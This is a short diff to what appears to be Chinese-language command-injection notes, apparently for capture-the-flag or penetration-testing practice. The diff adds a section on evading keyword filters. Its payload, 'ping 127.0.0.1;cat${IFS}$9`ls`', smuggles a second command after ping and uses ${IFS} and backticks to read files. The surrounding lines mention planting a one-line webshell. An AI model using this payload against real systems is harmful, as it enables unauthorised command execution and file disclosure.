@@ -439,6 +439,14 @@ python -m http.server 4444
 
 然后放一个一句话shell文件即可。
 
+#### 4. 内联命令绕过关键词
+
+可以使用反引号ls的输出作为cat的输入来绕过文件关键词。
+
+```shell
+ping 127.0.0.1;cat${IFS}$9`ls`
+```
+
 
 
 ## 0xff commix工具
